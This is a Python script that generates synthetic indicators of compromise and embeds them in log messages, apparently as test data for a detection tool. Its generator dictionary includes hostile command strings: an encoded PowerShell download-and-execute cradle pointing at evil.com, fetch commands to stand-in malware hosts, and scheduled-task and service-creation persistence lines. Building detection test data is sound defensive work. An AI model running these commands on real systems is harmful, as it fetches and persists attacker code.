import random
import string
import base64
from datetime import datetime
import uuid

# helper function to generate random string
def random_string(length=8):
    return ''.join(
        random.choices(
            string.ascii_lowercase + string.digits,
            k=length
        )
    )


# will be called to randomly embed iocs in log messages
def inject_iocs(base_log, max_inserts=3):
    keys = list(IOC_GENERATORS.keys())
    inserts = random.sample(keys, random.randint(1, max_inserts))

    for key in inserts:
        value = IOC_GENERATORS[key]()
        base_log +=f" {value}"

    return base_log


def random_hash(length):
    return ''.join(random.choices("abcdef" + string.digits, k=length))

def random_email():
    domains = ["example.com", "test.org", "mail.net"]
    return f"user{random.randint(1,999)}@{random.choice(domains)}"

def random_domain():
    return f"site{random.randint(1,50)}.com"

def random_url():
    return f"https://{random_domain()}/path/{random.randint(1,100)}"

def random_windows_path():
    return f"C:\\Users\\user{random.randint(1,10)}\\file{random.randint(1,10)}.exe"

def random_unix_path():
    return f"/var/log/app{random.randint(1,10)}.log"

def random_uuid():
    return str(uuid.uuid4())

# dict that mirror detection keys
IOC_GENERATORS = {

    # =========================
    # IPs / Networking
    # =========================
    "ipv4": lambda: ".".join(
        str(random.randint(1, 254)) for _ in range(4)
    ),

    "ipv6": lambda: ":".join(
        f"{random.randint(0, 65535):x}" for _ in range(8)
    ),

    "mac_address": lambda: ":".join(
        f"{random.randint(0,255):02x}" for _ in range(6)
    ),

    "port": lambda: str(random.randint(1, 65535)),

    "suspicious_ports": lambda: random.choice([
        "4444", "5555", "6666", "1337",
        "31337", "8080", "8443", "9001"
    ]),

    # =========================
    # Domains / URLs
    # =========================
    "domain": random_domain,

    "url": random_url,

    "ftp_url": lambda: (
        f"ftp://{random_domain()}/pub/file.txt"
    ),

    "tor_onion": lambda: (
        ''.join(random.choices("abcdefghijklmnopqrstuvwxyz234567", k=16))
        + ".onion"
    ),

    "s3_bucket": lambda: (
        f"https://s3.amazonaws.com/{random_string(8)}"
    ),

    # =========================
    # Email
    # =========================
    "email": random_email,

    # =========================
    # Hashes
    # =========================
    "md5": lambda: random_hash(32),

    "sha1": lambda: random_hash(40),

    "sha256": lambda: random_hash(64),

    "sha512": lambda: random_hash(128),

    # =========================
    # CVEs
    # =========================
    "cve": lambda: (
        f"CVE-{random.randint(2010,2026)}-"
        f"{random.randint(1000,99999)}"
    ),

    # =========================
    # Files
    # =========================
    "suspicious_file": lambda: random.choice([
        "payload.exe",
        "invoice.docm",
        "beacon.dll",
        "dropper.ps1",
        "macro.xlsm",
        "loader.js",
        "run.hta",
        "update.scr",
    ]),

    "archive_file": lambda: random.choice([
        "backup.zip",
        "payload.rar",
        "dropper.7z",
        "image.iso"
    ]),

    "script_file": lambda: random.choice([
        "stage.ps1",
        "loader.js",
        "dropper.vbs",
        "run.bat",
    ]),

    "any_file": lambda: (
        f"{random_string(6)}."
        f"{random.choice(['txt','log','cfg','dat'])}"
    ),

    # =========================
    # File Paths
    # =========================
    "windows_path": random_windows_path,

    "unix_path": random_unix_path,

    "unc_path": lambda: (
        f"\\\\SERVER-{random.randint(1,99)}\\share\\payload.exe"
    ),

    # =========================
    # Registry
    # =========================
    "registry_key": lambda: random.choice([
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\Software\Microsoft\Windows NT\CurrentVersion",
        r"HKCU\Environment",
    ]),

    # =========================
    # PowerShell
    # =========================
    "powershell_encoded": lambda: (
        "powershell.exe -enc "
        + base64.b64encode(
            b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
        ).decode()
    ),

    "powershell_download": lambda: random.choice([
        "Invoke-WebRequest http://evil.com/payload.exe",
        "iwr http://c2.bad/implant.ps1",
        "curl http://malware.cc/dropper",
    ]),

    # =========================
    # Execution
    # =========================
    "cmd_execution": lambda: random.choice([
        "cmd.exe",
        "powershell.exe",
        "rundll32.exe",
        "mshta.exe",
        "wscript.exe",
    ]),

    # =========================
    # UUIDs
    # =========================
    "uuid": random_uuid,

    # =========================
    # Timestamps
    # =========================
    "iso8601": lambda: (
        datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    ),

    "syslog": lambda: (
        datetime.utcnow().strftime("%b %d %H:%M:%S")
    ),

    # =========================
    # Windows Event IDs
    # =========================
    "windows_event_id": lambda: random.choice([
        "EventID: 4624",
        "EventID: 4625",
        "EventID: 4688",
        "EventID: 7045",
    ]),

    # =========================
    # Tokens / Secrets
    # =========================
    "jwt": lambda: (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        + random_string(32)
        + "."
        + random_string(32)
    ),

    "aws_key": lambda: (
        "AKIA" +
        ''.join(random.choices(
            string.ascii_uppercase + string.digits,
            k=16
        ))
    ),

    "github_token": lambda: (
        "ghp_" +
        ''.join(random.choices(
            string.ascii_letters + string.digits,
            k=36
        ))
    ),

    "slack_token": lambda: (
        "xoxb-" +
        ''.join(random.choices(
            string.ascii_letters + string.digits,
            k=24
        ))
    ),

    # =========================
    # Encoded Data
    # =========================
    "base64": lambda: (
        base64.b64encode(
            random_string(32).encode()
        ).decode()
    ),

    "hex_blob": lambda: (
        ''.join(random.choices(
            "0123456789abcdef",
            k=64
        ))
    ),

    # =========================
    # Malware Artifacts
    # =========================
    "mutex": lambda: random.choice([
        r"Global\MsWinZoneCacheCounterMutexA",
        r"Local\malware_mutex_01",
    ]),

    "scheduled_task": lambda: (
        "schtasks /create /tn updater /tr payload.exe"
    ),

    "service_creation": lambda: (
        "sc.exe create evilsvc binPath= payload.exe"
    ),

    # =========================
    # ASN
    # =========================
    "asn": lambda: f"AS{random.randint(1000,999999)}",
}

# IOC_GENERATORS = {
#     "ipv4": lambda: f"192.168.1.{random.randint(1,255)}",
#     "domain": random_domain,
#     "url": random_url,
#     "email": random_email,
#     "md5": lambda: random_hash(32),
#     "sha1": lambda: random_hash(40),
#     "sha256": lambda: random_hash(64),
#     "suspicious_file": lambda: f"malware{random.randint(1,10)}.exe",
#     "windows_path": random_windows_path,
#     "unix_path": random_unix_path,
#     "uuid": random_uuid,
#     "port": lambda: str(random.randint(1, 65535)),
#     "suspicious_ports": lambda: random.choice(["4444","5555","6666","1337","8080","8443"]),
# }